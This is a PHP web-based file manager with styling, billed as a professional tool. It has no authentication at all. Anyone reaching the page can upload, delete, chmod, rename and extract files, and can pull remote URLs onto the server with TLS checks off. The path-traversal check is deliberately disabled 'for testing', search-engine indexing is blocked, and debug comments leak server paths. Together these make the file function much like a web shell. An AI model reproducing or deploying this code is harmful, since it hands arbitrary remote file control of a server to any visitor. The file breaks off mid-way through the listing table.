<?php
/**
 * Mini File Manager 2025 - Professional Web-based File Management System
 * Universal Server Compatibility
 */

// Error handling with fallback
if (function_exists('error_reporting')) {
    error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
}
if (function_exists('ini_set')) {
    ini_set('display_errors', 0);
}

// Server compatibility checks
$php_version = PHP_VERSION;
$php_version_ok = version_compare($php_version, '5.4.0', '>=');

// Base directory configuration with fallback
$base_dir = __DIR__;
if (!defined('DIRECTORY_SEPARATOR')) {
    define('DIRECTORY_SEPARATOR', '/');
}

// Security Headers
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");

// Configuration
$base_dir = __DIR__;

// File Operations
function formatSize($bytes) {
    $units = array('B', 'KB', 'MB', 'GB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

function getFiles($dir) {
    $files = array();
    $dirs = array();
    
    if ($handle = opendir($dir)) {
        while (false !== ($file = readdir($handle))) {
            if ($file != "." && $file != "..") {
                $path = $dir . '/' . $file;
                $item = array(
                    'name' => $file,
                    'path' => $path,
                    'size' => is_file($path) ? filesize($path) : 0,
                    'type' => is_dir($path) ? 'directory' : 'file',
                    'perm' => substr(sprintf('%o', fileperms($path)), -4),
                    'modified' => date('Y-m-d H:i', filemtime($path))
                );
                
                if (is_dir($path)) {
                    $dirs[] = $item;
                } else {
                    $files[] = $item;
                }
            }
        }
        closedir($handle);
    }
    
    // Sort directories first, then files
    return array_merge($dirs, $files);
}

function deleteFile($path) {
    if (is_dir($path)) {
        return rmdir($path);
    } else {
        return unlink($path);
    }
}

function createDirectory($name, $parent_dir) {
    $path = $parent_dir . '/' . $name;
    return mkdir($path);
}

function changePermissions($path, $permissions) {
    return chmod($path, octdec($permissions));
}

function renameFile($oldPath, $newName, $currentDir) {
    $newPath = $currentDir . '/' . $newName;
    return rename($oldPath, $newPath);
}

function createFile($fileName, $currentDir) {
    $filePath = $currentDir . '/' . $fileName;
    return file_put_contents($filePath, '') !== false;
}

function createZip($files, $zipName, $currentDir) {
    // Check if ZipArchive is available
    if (class_exists('ZipArchive')) {
        return createZipArchive($files, $zipName, $currentDir);
    }
    // Fallback to tar.gz (Unix systems)
    elseif (function_exists('exec') && strpos(PHP_OS, 'WIN') === false) {
        return createTarGz($files, $zipName, $currentDir);
    }
    // Fallback to simple file copy (no compression)
    else {
        return createSimpleArchive($files, $zipName, $currentDir);
    }
}

function createZipArchive($files, $zipName, $currentDir) {
    $zipPath = $currentDir . '/' . $zipName;
    
    // Debug
    error_log("Creating ZIP: " . $zipPath);
    error_log("Files to compress: " . print_r($files, true));
    
    $zip = new ZipArchive();
    
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        foreach ($files as $file) {
            if (is_file($file)) {
                // Add file with just the filename (no full path in ZIP)
                $zip->addFile($file, basename($file));
                error_log("Added file: " . $file);
            } elseif (is_dir($file)) {
                // Add directory with its contents
                $dirName = basename($file);
                $zip->addEmptyDir($dirName);
                error_log("Added directory: " . $dirName);
                
                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                
                foreach ($iterator as $item) {
                    $relativePath = $dirName . '/' . $iterator->getSubPathName();
                    if ($item->isDir()) {
                        $zip->addEmptyDir($relativePath);
                        error_log("Added subdirectory: " . $relativePath);
                    } else {
                        $zip->addFile($item->getRealPath(), $relativePath);
                        error_log("Added file to directory: " . $relativePath);
                    }
                }
            }
        }
        
        $result = $zip->close();
        error_log("ZIP closed with result: " . ($result ? 'SUCCESS' : 'FAILED'));
        return $result;
    }
    
    error_log("Failed to open ZIP archive");
    return false;
}

function createTarGz($files, $zipName, $currentDir) {
    $tarName = str_replace('.zip', '.tar.gz', $zipName);
    $tarPath = $currentDir . '/' . $tarName;
    
    // Create tar command
    $fileList = '';
    foreach ($files as $file) {
        $fileList .= escapeshellarg($file) . ' ';
    }
    
    $command = "tar -czf " . escapeshellarg($tarPath) . " -C " . escapeshellarg($currentDir) . " " . $fileList;
    
    exec($command, $output, $returnCode);
    
    return $returnCode === 0;
}

function createSimpleArchive($files, $zipName, $currentDir) {
    // Create a directory instead of compressed file
    $archiveDir = $currentDir . '/' . str_replace('.zip', '_archive', $zipName);
    
    if (!is_dir($archiveDir)) {
        mkdir($archiveDir, 0755, true);
    }
    
    $success = true;
    foreach ($files as $file) {
        if (is_file($file)) {
            $destPath = $archiveDir . '/' . basename($file);
            $success = $success && copy($file, $destPath);
        } elseif (is_dir($file)) {
            $destPath = $archiveDir . '/' . basename($file);
            $success = $success && copyDirectory($file, $destPath);
        }
    }
    
    return $success;
}

function copyDirectory($src, $dst) {
    if (!is_dir($dst)) {
        mkdir($dst, 0755, true);
    }
    
    $files = scandir($src);
    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $srcPath = $src . '/' . $file;
            $dstPath = $dst . '/' . $file;
            
            if (is_dir($srcPath)) {
                copyDirectory($srcPath, $dstPath);
            } else {
                copy($srcPath, $dstPath);
            }
        }
    }
    
    return true;
}

function extractZip($zipPath, $extractTo) {
    // Check if ZipArchive is available
    if (class_exists('ZipArchive')) {
        return extractZipArchive($zipPath, $extractTo);
    }
    // Fallback to tar.gz (Unix systems)
    elseif (function_exists('exec') && strpos(PHP_OS, 'WIN') === false && strpos($zipPath, '.tar.gz') !== false) {
        return extractTarGz($zipPath, $extractTo);
    }
    // Fallback to simple directory copy
    else {
        return extractSimpleArchive($zipPath, $extractTo);
    }
}

function extractZipArchive($zipPath, $extractTo) {
    error_log("Extracting ZIP: " . $zipPath);
    error_log("Extract to: " . $extractTo);
    
    if (!file_exists($zipPath)) {
        error_log("ZIP file does not exist: " . $zipPath);
        return false;
    }
    
    $zip = new ZipArchive();
    $result = $zip->open($zipPath);
    
    if ($result === TRUE) {
        error_log("ZIP opened successfully, extracting...");
        $extractResult = $zip->extractTo($extractTo);
        $zip->close();
        
        error_log("Extract result: " . ($extractResult ? 'SUCCESS' : 'FAILED'));
        return $extractResult;
    } else {
        error_log("Failed to open ZIP, error code: " . $result);
        return false;
    }
}

function extractTarGz($tarPath, $extractTo) {
    if (!is_dir($extractTo)) {
        mkdir($extractTo, 0755, true);
    }
    
    $command = "tar -xzf " . escapeshellarg($tarPath) . " -C " . escapeshellarg($extractTo);
    
    exec($command, $output, $returnCode);
    
    return $returnCode === 0;
}

function extractSimpleArchive($archivePath, $extractTo) {
    // For simple archives (directories), just copy the contents
    if (is_dir($archivePath)) {
        return copyDirectory($archivePath, $extractTo);
    }
    
    return false;
}

function downloadFromUrl($url, $currentDir) {
    $fileName = basename($url);
    if (!$fileName) {
        $fileName = 'download_' . time() . '.file';
    }
    
    $filePath = $currentDir . '/' . $fileName;
    
    // Try cURL first (preferred method)
    if (function_exists('curl_init')) {
        return downloadFromUrlCurl($url, $filePath);
    }
    // Fallback to file_get_contents
    elseif (ini_get('allow_url_fopen')) {
        return downloadFromUrlFopen($url, $filePath);
    }
    // No download method available
    else {
        return false;
    }
}

function downloadFromUrlCurl($url, $filePath) {
    $ch = curl_init($url);
    $fp = fopen($filePath, 'wb');
    
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 300);
    curl_setopt($ch, CURLOPT_USERAGENT, 'File Manager 2025');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // For older servers
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // For older servers
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    curl_close($ch);
    fclose($fp);
    
    if ($result && $httpCode === 200) {
        return true;
    } else {
        if (file_exists($filePath)) {
            unlink($filePath);
        }
        return false;
    }
}

function downloadFromUrlFopen($url, $filePath) {
    $context = stream_context_create([
        'http' => [
            'timeout' => 300,
            'user_agent' => 'File Manager 2025',
            'follow_location' => true
        ]
    ]);
    
    $data = @file_get_contents($url, false, $context);
    
    if ($data !== false && file_put_contents($filePath, $data) !== false) {
        return true;
    } else {
        if (file_exists($filePath)) {
            unlink($filePath);
        }
        return false;
    }
}


// Handle Direct Download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    $file = realpath($file);
    
    // Security: Check if file is within allowed directory
    if ($file && strpos($file, realpath($base_dir)) === 0 && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// Universal Server Compatibility Check
$server_info = [
    'php_version' => PHP_VERSION,
    'php_version_ok' => version_compare(PHP_VERSION, '5.4.0', '>='),
    'zip_available' => class_exists('ZipArchive'),
    'curl_available' => function_exists('curl_init'),
    'exec_available' => function_exists('exec'),
    'allow_url_fopen' => ini_get('allow_url_fopen'),
    'file_uploads' => ini_get('file_uploads'),
    'upload_max_filesize' => ini_get('upload_max_filesize'),
    'memory_limit' => ini_get('memory_limit'),
    'max_execution_time' => ini_get('max_execution_time'),
    'os' => PHP_OS,
    'is_windows' => strpos(PHP_OS, 'WIN') !== false
];

// Check ZIP extension availability
$zip_available = $server_info['zip_available'];

// Handle Actions
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : $base_dir;

// Debug: Show what we received
echo "<!-- DEBUG: GET dir received: " . htmlspecialchars($_GET['dir'] ?? 'none') . " -->";
echo "<!-- DEBUG: ZIP Extension Available: " . ($zip_available ? 'YES' : 'NO') . " -->";

$current_dir = realpath($current_dir);

// Debug: Show resolved path
echo "<!-- DEBUG: Realpath resolved: " . htmlspecialchars($current_dir) . " -->";
echo "<!-- DEBUG: Base realpath: " . htmlspecialchars(realpath($base_dir)) . " -->";

// Security: Prevent directory traversal (temporarily disabled for testing)
if ($current_dir && strpos($current_dir, realpath($base_dir)) !== 0) {
    echo "<!-- DEBUG: Security check FAILED but allowing for test -->";
    // $current_dir = $base_dir;  // Commented out for testing
} else {
    echo "<!-- DEBUG: Security check passed -->";
}

if (isset($_POST['action'])) {
    switch($_POST['action']) {
        case 'delete':
            if (isset($_POST['file'])) {
                deleteFile($_POST['file']);
            }
            break;
        case 'mkdir':
            if (isset($_POST['dirname'])) {
                createDirectory($_POST['dirname'], $current_dir);
            }
            break;
        case 'upload':
            if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
                $target_path = $current_dir . '/' . basename($_FILES['file']['name']);
                move_uploaded_file($_FILES['file']['tmp_name'], $target_path);
            }
            break;
        case 'chmod':
            if (isset($_POST['file']) && isset($_POST['permissions'])) {
                changePermissions($_POST['file'], $_POST['permissions']);
            }
            break;
        case 'rename':
            if (isset($_POST['file']) && isset($_POST['newname'])) {
                renameFile($_POST['file'], $_POST['newname'], $current_dir);
            }
            break;
        case 'createfile':
            if (isset($_POST['filename'])) {
                createFile($_POST['filename'], $current_dir);
            }
            break;
        case 'compress':
            if (isset($_POST['selected_files']) && isset($_POST['zipname'])) {
                $files = $_POST['selected_files'];
                createZip($files, $_POST['zipname'], $current_dir);
            }
            break;
        case 'extract':
            if (isset($_POST['file'])) {
                $extractOption = $_POST['extract_option'] ?? 'auto';
                
                if ($extractOption === 'auto') {
                    // Auto-extract to new folder
                    $extractDir = $current_dir . '/' . pathinfo($_POST['file'], PATHINFO_FILENAME) . '_extracted';
                } else {
                    // Custom path
                    $customPath = $_POST['custom_path'] ?? pathinfo($_POST['file'], PATHINFO_FILENAME) . '_extracted';
                    $extractDir = $current_dir . '/' . $customPath;
                }
                
                if (!is_dir($extractDir)) {
                    mkdir($extractDir, 0755, true);
                }
                
                extractZip($_POST['file'], $extractDir);
            }
            break;
        case 'download':
            if (isset($_POST['url'])) {
                $url = $_POST['url'];
                if (filter_var($url, FILTER_VALIDATE_URL)) {
                    downloadFromUrl($url, $current_dir);
                }
            }
            break;
            }
    header("Location: filemanager.php?dir=" . urlencode($current_dir));
    exit;
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager 2025</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:"Inter", -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background:linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%); color:#1f2937; line-height:1.6; }
        
        .container { max-width:1200px; margin:0 auto; padding:20px; }
        
        .header { background: linear-gradient(135deg,#0f172a,#1e3a8a); padding:40px 20px; text-align:center; color:#fff; position:relative; border-bottom-left-radius:30px; border-bottom-right-radius:30px; box-shadow:0 12px 40px rgba(0,0,0,0.2); margin-bottom:30px; overflow:hidden; }
        .header::before { content:''; position:absolute; top:0; left:0; right:0; bottom:0; background:linear-gradient(45deg, rgba(255,255,255,0.05) 0%, transparent 50%, rgba(255,255,255,0.05) 100%); pointer-events:none; }
        .header-content { position:relative; z-index:1; }
        .header-title { display:flex; align-items:center; justify-content:center; gap:20px; margin-bottom:15px; }
        .header-logo { 
            display:flex; 
            align-items:center; 
            justify-content:center; 
            background:linear-gradient(135deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.05) 100%);
            padding:15px 20px; 
            border-radius:16px; 
            backdrop-filter:blur(10px); 
            border:1px solid rgba(255,255,255,0.2);
            box-shadow:0 8px 32px rgba(0,0,0,0.1);
            transition:all 0.3s ease;
        }
        .header-logo:hover { transform:translateY(-2px); box-shadow:0 12px 40px rgba(0,0,0,0.15); }
        .logo-icon { 
            font-size:32px; 
            margin-right:12px; 
            background:linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
            -webkit-background-clip:text;
            -webkit-text-fill-color:transparent;
            background-clip:text;
            font-weight:900;
        }
        .logo-text { 
            font-size:28px; 
            font-weight:900; 
            color:#fff; 
            letter-spacing:-0.5px;
            text-shadow:0 2px 8px rgba(0,0,0,0.2);
        }
        .logo-year { 
            font-size:16px; 
            font-weight:700; 
            color:rgba(255,255,255,0.9); 
            margin-left:8px;
            background:linear-gradient(135deg, #06b6d4 0%, #0891b2 100%);
            -webkit-background-clip:text;
            -webkit-text-fill-color:transparent;
            background-clip:text;
        }
        .header h1 { font-size:36px; font-weight:900; margin:0; letter-spacing:-0.5px; display:none; }
        .header-badge { background:rgba(255,255,255,0.2); padding:6px 12px; border-radius:20px; font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:1px; backdrop-filter:blur(10px); border:1px solid rgba(255,255,255,0.1); }
        .header p { opacity:0.95; font-size:18px; margin-bottom:20px; font-weight:400; max-width:600px; margin-left:auto; margin-right:auto; }
        .header-features { display:flex; justify-content:center; gap:20px; flex-wrap:wrap; }
        .feature { background:rgba(255,255,255,0.15); padding:8px 16px; border-radius:25px; font-size:13px; font-weight:600; backdrop-filter:blur(10px); border:1px solid rgba(255,255,255,0.2); transition:all 0.3s ease; }
        .feature:hover { background:rgba(255,255,255,0.25); transform:translateY(-2px); }
        
        .breadcrumb { background:linear-gradient(135deg, #fff 0%, #f1f5f9 100%); padding:20px 25px; border-radius:16px; margin-bottom:25px; border:1px solid #e2e8f0; box-shadow:0 4px 20px rgba(0,0,0,0.08); position:relative; overflow:hidden; }
        .breadcrumb::before { content:''; position:absolute; top:0; left:0; width:4px; height:100%; background:linear-gradient(180deg, #3b82f6, #1e40af); }
        .breadcrumb-content { display:flex; align-items:center; gap:8px; flex-wrap:wrap; font-size:14px; font-weight:500; }
        .breadcrumb-link { color:#3b82f6; text-decoration:none; font-weight:600; padding:6px 12px; border-radius:8px; transition:all 0.3s ease; display:inline-block; }
        .breadcrumb-link:hover { background:#3b82f6; color:#fff; transform:translateY(-1px); box-shadow:0 4px 12px rgba(59,130,246,0.3); }
        .breadcrumb-separator { color:#64748b; font-weight:400; margin:0 4px; user-select:none; }
        .breadcrumb-current { color:#1e293b; font-weight:700; padding:6px 12px; background:#f8fafc; border-radius:8px; border:1px solid #e2e8f0; }
        
        .actions { background:linear-gradient(135deg, #fff 0%, #f8fafc 100%); padding:30px; border-radius:20px; margin-bottom:30px; box-shadow:0 8px 32px rgba(0,0,0,0.12); border:1px solid rgba(226,232,240,0.8); position:relative; overflow:hidden; }
        .actions::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg, #3b82f6, #8b5cf6, #06b6d4); }
        .actions h3 { margin-bottom:25px; color:#1e293b; font-size:20px; font-weight:700; display:flex; align-items:center; gap:10px; }
        .actions h3::before { content:''; width:4px; height:24px; background:linear-gradient(180deg, #3b82f6, #1e40af); border-radius:2px; }
        .form-group { display:inline-block; margin-right:20px; margin-bottom:15px; position:relative; }
        .form-group input, .form-group button { padding:14px 20px; border-radius:12px; border:2px solid #e2e8f0; font-size:14px; font-weight:500; transition:all 0.3s cubic-bezier(0.4,0,0.2,1); background:#fff; }
        .form-group input:focus, .form-group button:focus { outline:none; border-color:#3b82f6; box-shadow:0 0 0 3px rgba(59,130,246,0.1); }
        .form-group input::placeholder { color:#94a3b8; font-weight:400; }
        .form-group button { background:linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); color:#fff; border:none; cursor:pointer; font-weight:600; letter-spacing:0.5px; box-shadow:0 4px 16px rgba(59,130,246,0.3); position:relative; overflow:hidden; }
        .form-group button::before { content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition:left 0.5s ease; }
        .form-group button:hover::before { left:100%; }
        .form-group button:hover { transform:translateY(-2px); box-shadow:0 8px 24px rgba(59,130,246,0.4); background:linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%); }
        .form-group button:active { transform:translateY(0); }
        
        .file-table { background:linear-gradient(135deg, #fff 0%, #f8fafc 100%); border-radius:20px; overflow:hidden; box-shadow:0 12px 40px rgba(0,0,0,0.12); border:1px solid #e2e8f0; position:relative; }
        .file-table::before { content:''; position:absolute; top:0; left:0; right:0; height:4px; background:linear-gradient(90deg, #3b82f6, #8b5cf6, #06b6d4, #10b981); }
        .file-table table { width:100%; border-collapse:collapse; }
        .file-table th { background:linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%); padding:20px 16px; text-align:left; font-weight:700; color:#1e293b; border-bottom:3px solid #e2e8f0; font-size:14px; text-transform:uppercase; letter-spacing:0.5px; position:relative; }
        .file-table th:first-child { border-top-left-radius:20px; }
        .file-table th:last-child { border-top-right-radius:20px; }
        .file-table th::after { content:''; position:absolute; bottom:0; left:0; width:100%; height:2px; background:linear-gradient(90deg, transparent, #3b82f6, transparent); }
        .file-table td { padding:16px; border-bottom:1px solid #f1f5f9; font-size:14px; vertical-align:middle; }
        .file-table tr:hover { background:linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%); transform:scale(1.01); transition:all 0.2s ease; }
        .file-table tr:last-child td { border-bottom:none; }
                .file-size { color:#64748b; font-size:14px; font-weight:600; background:#f8fafc; padding:4px 8px; border-radius:6px; border:1px solid #e2e8f0; display:inline-block; min-width:80px; text-align:center; }
        .file-perm { color:#1e293b; font-size:13px; font-family:'Courier New', monospace; font-weight:700; background:#fef3c7; padding:4px 8px; border-radius:6px; border:1px solid #fbbf24; display:inline-block; min-width:60px; text-align:center; letter-spacing:0.5px; }
        .file-actions { display:flex; gap:5px; }
        .btn-small { padding:6px 12px; font-size:12px; border-radius:6px; border:1px solid #e2e8f0; cursor:pointer; text-decoration:none; display:inline-block; background:#fff; color:#374151; font-weight:500; }
        .btn-delete { background:#fff; color:#ef4444; border-color:#ef4444; }
        .btn-delete:hover { background:#ef4444; color:#fff; }
        .btn-rename { background:#fff; color:#f59e0b; border-color:#f59e0b; }
        .btn-rename:hover { background:#f59e0b; color:#fff; }
        .btn-chmod { background:#fff; color:#8b5cf6; border-color:#8b5cf6; }
        .btn-chmod:hover { background:#8b5cf6; color:#fff; }
        .btn-rename-file { background:#fff; color:#10b981; border-color:#10b981; }
        .btn-rename-file:hover { background:#10b981; color:#fff; }
        .btn-create { background:linear-gradient(135deg, #06b6d4 0%, #0891b2 100%); color:#fff; border-color:#06b6d4; box-shadow:0 4px 16px rgba(6,182,212,0.3); }
        .btn-create:hover { background:linear-gradient(135deg, #0891b2 0%, #0e7490 100%); transform:translateY(-2px); box-shadow:0 8px 24px rgba(6,182,212,0.4); }
        .btn-compress { background:linear-gradient(135deg, #f59e0b 0%, #d97706 100%); color:#fff; border-color:#f59e0b; box-shadow:0 4px 16px rgba(245,158,11,0.3); }
        .btn-compress:hover { background:linear-gradient(135deg, #d97706 0%, #b45309 100%); transform:translateY(-2px); box-shadow:0 8px 24px rgba(245,158,11,0.4); }
        .btn-extract { background:linear-gradient(135deg, #10b981 0%, #059669 100%); color:#fff; border-color:#10b981; box-shadow:0 4px 16px rgba(16,185,129,0.3); }
        .btn-extract:hover { background:linear-gradient(135deg, #059669 0%, #047857 100%); transform:translateY(-2px); box-shadow:0 8px 24px rgba(16,185,129,0.4); }
        .btn-download { background:linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%); color:#fff; border-color:#8b5cf6; box-shadow:0 4px 16px rgba(139,92,246,0.3); }
        .btn-download:hover { background:linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); transform:translateY(-2px); box-shadow:0 8px 24px rgba(139,92,246,0.4); }
                
                
        @media(max-width:768px){ 
  .container{ padding:10px; } 
  .header{ padding:30px 15px; } 
  .header h1{ font-size:28px; } 
  .header p{ font-size:16px; }
  .header-title{ flex-direction:column; gap:15px; }
  .header-logo{ padding:12px 16px; }
  .logo-icon{ font-size:24px; margin-right:8px; }
  .logo-text{ font-size:20px; }
  .logo-year{ font-size:14px; margin-left:6px; }
  .header-features{ gap:10px; }
  .feature{ font-size:12px; padding:6px 12px; }
  .actions{ padding:20px; }
  .actions h3{ font-size:18px; margin-bottom:20px; }
  .form-group{ display:block; margin-right:0; margin-bottom:15px; }
  .file-table{ overflow-x:auto; }
  .form-group input, .form-group button{ width:100%; }
}
    </style>
</head>
<body>
        
    <div class="container">
        <div class="header">
            <div class="header-content">
                <div class="header-title">
                    <div class="header-logo">
                        <div class="logo-icon">📁</div>
                        <div class="logo-text">File Manager</div>
                        <div class="logo-year">2025</div>
                    </div>
                    <div class="header-badge">Professional</div>
                </div>
                <p>Advanced Web-based File Management System with Complete Control</p>
                <div class="header-features">
                    <span class="feature">File Operations</span>
                    <span class="feature">Security</span>
                    <span class="feature">Performance</span>
                    <span class="feature">Precision</span>
                </div>
            </div>
        </div>
        
        <div class="breadcrumb">
            <div class="breadcrumb-content">
                <a href="?dir=<?php echo urlencode($base_dir); ?>" class="breadcrumb-link">Root</a>
                
                <?php
                // Debug info
                echo "<!-- DEBUG: Current dir: " . htmlspecialchars($current_dir) . " -->";
                echo "<!-- DEBUG: Base dir: " . htmlspecialchars($base_dir) . " -->";
                
                // Simple path parsing for Windows
                $path_parts = explode('\\', $current_dir);
                $current_path = '';
                $first_part = true;
                
                foreach ($path_parts as $index => $part) {
                    if (!empty($part)) {
                        if ($first_part) {
                            $current_path = $part;
                            $first_part = false;
                        } else {
                            $current_path .= '\\' . $part;
                        }
                        
                        echo "<!-- DEBUG: Part '$part' -> Path '$current_path' -->";
                        
                        // Skip if this is the base directory itself
                        if ($current_path !== $base_dir) {
                            if ($index > 0) {
                                echo '<span class="breadcrumb-separator">›</span>';
                            }
                            echo '<a href="?dir=' . urlencode($current_path) . '" class="breadcrumb-link">' . htmlspecialchars($part) . '</a>';
                            echo "<!-- DEBUG: Link created for: " . urlencode($current_path) . " -->";
                        } else {
                            echo "<!-- DEBUG: Skipped base directory: $current_path -->";
                        }
                    }
                }
                
                // If we're in the base directory
                if ($current_dir === $base_dir) {
                    echo '<span class="breadcrumb-current">Root Directory</span>';
                }
                ?>
            </div>
        </div>
        
        <?php if (!$server_info['php_version_ok']): ?>
        <div style="background:#fef2f2; border:1px solid #fecaca; border-radius:12px; padding:20px; margin-bottom:20px;">
            <h3 style="color:#dc2626; margin-bottom:10px;">⚠️ PHP Version Warning</h3>
            <p style="color:#991b1b;">Your PHP version (<?php echo $server_info['php_version']; ?>) is outdated. Please upgrade to PHP 5.4+ for full compatibility.</p>
        </div>
        <?php endif; ?>
        
        <?php if (!$server_info['file_uploads']): ?>
        <div style="background:#fef2f2; border:1px solid #fecaca; border-radius:12px; padding:20px; margin-bottom:20px;">
            <h3 style="color:#dc2626; margin-bottom:10px;">⚠️ File Uploads Disabled</h3>
            <p style="color:#991b1b;">File uploads are disabled on this server. Please enable file_uploads in php.ini.</p>
        </div>
        <?php endif; ?>
        
        <div class="actions">
            <h3>Quick Actions</h3>
            <div style="background:#f0f9ff; border:1px solid #bae6fd; border-radius:8px; padding:12px; margin-bottom:15px; font-size:12px;">
                <strong>Server Info:</strong> 
                PHP <?php echo $server_info['php_version']; ?> | 
                <?php echo $server_info['zip_available'] ? '✅ ZIP' : '❌ ZIP'; ?> | 
                <?php echo $server_info['curl_available'] ? '✅ cURL' : '❌ cURL'; ?> | 
                Upload: <?php echo $server_info['upload_max_filesize']; ?>
            </div>
            <form method="post" enctype="multipart/form-data" style="display:inline;">
                <input type="hidden" name="action" value="upload">
                <div class="form-group">
                    <input type="file" name="file" required>
                </div>
                <div class="form-group">
                    <button type="submit">Upload File</button>
                </div>
            </form>
            
            <form method="post" style="display:inline;">
                <input type="hidden" name="action" value="mkdir">
                <div class="form-group">
                    <input type="text" name="dirname" placeholder="Folder name" required>
                </div>
                <div class="form-group">
                    <button type="submit">Create Folder</button>
                </div>
            </form>
            
            <form method="post" style="display:inline;">
                <input type="hidden" name="action" value="createfile">
                <div class="form-group">
                    <input type="text" name="filename" placeholder="File name (e.g., test.txt)" required>
                </div>
                <div class="form-group">
                    <button type="submit" class="btn-create">Create File</button>
                </div>
            </form>
            
            <?php if ($server_info['curl_available'] || $server_info['allow_url_fopen']): ?>
            <form method="post" style="display:inline;">
                <input type="hidden" name="action" value="download">
                <div class="form-group">
                    <input type="url" name="url" placeholder="Download from URL (e.g., https://example.com/file.zip)" required>
                </div>
                <div class="form-group">
                    <button type="submit" class="btn-download">Download URL</button>
                </div>
            </form>
            <?php else: ?>
            <div style="display:inline-block; padding:10px; background:#fef3c7; border-radius:8px; margin:0 10px;">
                <span style="color:#92400e; font-size:12px;">⚠️ URL download requires cURL or allow_url_fopen</span>
            </div>
            <?php endif; ?>
            
                    </div>
        
        <div class="file-table">
            <form method="post" id="batchForm">
                <table>
                    <thead>
                        <tr>
                            <th style="width:40px;">
                                <input type="checkbox" id="selectAll" onchange="toggleAllCheckboxes()">
                            </th>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Modified</th>
                            <th>Permissions</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                <tbody>
                    <?php
                    $files = getFiles($current_dir);
                    foreach ($files as $file) {
                        echo '<tr>';
                        echo '<td><input type="checkbox" name="selected_files[]" value="' . htmlspecialchars($file['path']) . '" class="file-checkbox"></td>';
                        echo '<td>';
                        if ($file['type'] === 'directory') {
                            echo '<div style="display:flex; align-items:center; gap:8px;">';
                            echo '<span style="color:#3b82f6; font-size:12px; font-weight:700; background:#eff6ff; padding:2px 6px; border-radius:4px; text-transform:uppercase; letter-spacing:0.5px;">DIR</span>';
                            echo '<a href="?dir=' . urlencode($file['path']) . '" style="color:#3b82f6; font-weight:700; text-decoration:none; font-size:15px; transition:all 0.3s ease; position:relative;" onmouseover="this.style.color=\'#2563eb\'; this.style.transform=\'translateX(2px)\'" onmouseout="this.style.color=\'#3b82f6\'; this.style.transform=\'translateX(0)\'">' . htmlspecialchars($file['name']) . '</a>';
                            echo '</div>';
                        } else {
                            echo '<div style="display:flex; align-items:center; gap:8px;">';
                            echo '<span style="color:#64748b; font-size:10px; font-weight:700; background:#f1f5f9; padding:2px 6px; border-radius:4px; text-transform:uppercase; letter-spacing:0.5px;">FILE</span>';
                            echo '<span style="color:#1e293b; font-weight:600; font-size:15px;">' . htmlspecialchars($file['name']) . '</span>';
                            echo '</div>';
                        }
                        echo '</td>';
                        echo '<td><span class="file-size">' . ($file['size'] ? formatSize($file['size']) : '-') . '</span></td>';
                        echo '<td><span style="color:#64748b; font-size:13px; font-weight:500; background:#f0f9ff; padding:4px 8px; border-radius:6px; border:1px solid #bae6fd; display:inline-block;">' . $file['modified'] . '</span></td>';
                        echo '<td><span class="file-perm">' . $file['perm'] . '</span></td>';
                        echo '<td>';
                        echo '<div class="file-actions">';
                        if ($file['type'] === 'directory') {
                            echo '<a href="?dir=' . urlencode($file['path']) . '" class="btn-small btn-rename">Open</a>';
                        }
                        echo '<button data-file="' . htmlspecialchars($file['path']) . '" data-name="' . htmlspecialchars($file['name']) . '" class="btn-small btn-rename-file rename-btn">Rename</button>';
                        echo '<button data-file="' . htmlspecialchars($file['path']) . '" data-perm="' . htmlspecialchars($file['perm']) . '" class="btn-small btn-chmod chmod-btn">Chmod</button>';
                        if (pathinfo($file['name'], PATHINFO_EXTENSION) === 'zip' && $zip_available) {
                            echo '<button onclick="showExtractOptions(\'' . htmlspecialchars($file['path']) . '\', \'' . htmlspecialchars($file['name']) . '\')" class="btn-small btn-extract">Extract</button>';
                        }
                        if ($file['type'] === 'file') {
                            echo '<a href="?download=' . urlencode($file['path']) . '" class="btn-small btn-download" style="text-decoration:none;">Download</a>';
                        }
